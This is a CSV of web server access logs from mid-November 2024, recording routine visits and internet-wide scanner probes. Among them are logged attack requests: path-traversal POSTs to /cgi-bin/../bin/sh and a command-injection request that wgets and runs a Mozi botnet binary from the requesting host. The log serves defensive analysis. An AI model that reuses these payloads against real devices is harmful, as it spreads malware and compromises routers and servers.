ip,date,method,endpoint,status,size
185.209.120.2,14/Nov/2024:18:00:20 +0000,GET,/,304,
185.209.120.2,14/Nov/2024:18:00:20 +0000,GET,/styles.css,304,
185.209.120.2,14/Nov/2024:18:00:23 +0000,GET,/,200,1755.0
185.209.120.2,14/Nov/2024:18:00:23 +0000,GET,/styles.css,200,1716.0
185.209.120.2,14/Nov/2024:18:00:24 +0000,GET,/,200,1755.0
185.209.120.2,14/Nov/2024:18:00:24 +0000,GET,/styles.css,200,1716.0
5.8.11.202,14/Nov/2024:21:32:19 +0000,GET,/,200,1755.0
94.156.248.4,14/Nov/2024:22:27:21 +0000,GET,/,200,1755.0
173.255.221.189,15/Nov/2024:00:35:31 +0000,,-,408,
173.255.221.189,15/Nov/2024:00:36:08 +0000,,-,408,
173.255.221.189,15/Nov/2024:00:36:30 +0000,,-,408,
173.255.221.189,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
185.242.226.80,15/Nov/2024:00:42:08 +0000,GET,/,200,1755.0
47.237.132.128,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
205.210.31.146,15/Nov/2024:06:04:26 +0000,GET,/,200,1755.0
194.50.16.198,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0
198.235.24.232,15/Nov/2024:09:00:04 +0000,GET,/,200,1755.0
5.8.11.202,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0
76.244.4.90,15/Nov/2024:09:27:03 +0000,HEAD,/,200,
5.8.11.202,15/Nov/2024:10:30:54 +0000,GET,/,200,1755.0
80.82.77.202,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
185.209.120.3,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0
185.209.120.3,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0
5.8.11.202,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0
152.42.243.111,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0
205.210.31.15,15/Nov/2024:18:39:30 +0000,GET,/,200,1755.0
194.50.16.198,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0
152.42.219.47,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
92.249.48.232,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
194.50.16.198,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
152.42.136.45,16/Nov/2024:07:06:21 +0000,GET,/,200,1755.0
152.42.214.140,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
152.42.214.140,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
159.65.190.39,16/Nov/2024:12:55:57 +0000,GET,/,200,1755.0
159.65.190.39,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
139.59.101.104,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
194.50.16.198,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
167.94.138.160,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
152.42.214.140,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
80.82.77.202,16/Nov/2024:19:25:30 +0000,GET,/,200,1755.0
8.222.151.66,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
205.210.31.164,16/Nov/2024:23:08:32 +0000,GET,/,200,1755.0
152.42.214.50,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
152.42.214.140,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
5.8.11.202,17/Nov/2024:01:44:28 +0000,GET,/,200,1755.0
222.254.217.214,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
14.167.198.63,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
93.174.93.12,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
45.149.241.114,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
114.33.126.55,17/Nov/2024:05:26:59 +0000,GET,/,200,1755.0
120.229.204.159,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
152.42.174.244,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
167.94.145.97,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
93.174.93.12,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
5.8.11.202,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
125.229.134.120,17/Nov/2024:15:53:55 +0000,GET,/,200,1755.0
152.42.243.111,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
152.42.243.111,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
149.50.106.25,17/Nov/2024:16:54:02 +0000,GET,/,200,1755.0
95.214.55.79,17/Nov/2024:17:26:14 +0000,GET,/,200,1755.0
206.168.34.43,17/Nov/2024:17:47:01 +0000,GET,/,200,1755.0
185.191.126.248,17/Nov/2024:18:01:20 +0000,GET,/,200,1755.0
199.45.154.146,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
199.45.154.146,17/Nov/2024:18:16:51 +0000,GET,/,200,1755.0
199.45.154.146,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
92.255.57.150,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
172.104.11.34,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
205.210.31.18,17/Nov/2024:22:51:17 +0000,GET,/,200,1755.0
95.214.53.91,17/Nov/2024:22:52:45 +0000,GET,/,200,1755.0
159.223.67.34,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
65.49.20.66,18/Nov/2024:03:19:59 +0000,GET,/,200,1755.0
65.49.20.66,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
185.191.126.248,18/Nov/2024:05:00:12 +0000,GET,/,200,1755.0
185.191.126.248,18/Nov/2024:06:43:04 +0000,GET,/,200,1755.0
5.35.104.31,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
93.174.93.12,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
152.42.214.140,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
159.223.67.34,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
159.223.67.34,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
178.128.54.126,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
95.214.53.205,18/Nov/2024:10:05:14 +0000,GET,/,200,1755.0
194.50.16.198,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
164.52.24.188,18/Nov/2024:14:34:03 +0000,GET,/,200,1755.0
164.52.24.188,18/Nov/2024:14:34:06 +0000,GET,/,200,1755.0
164.52.24.188,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
164.52.24.188,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
46.174.191.32,18/Nov/2024:14:41:18 +0000,GET,/,200,1755.0
152.42.243.206,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
80.82.77.202,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
93.174.93.12,18/Nov/2024:21:01:30 +0000,GET,/,200,1755.0
95.214.53.205,18/Nov/2024:21:45:35 +0000,GET,/,200,1755.0
205.210.31.220,18/Nov/2024:22:14:12 +0000,GET,/,200,1755.0
93.174.93.12,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
159.223.69.51,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
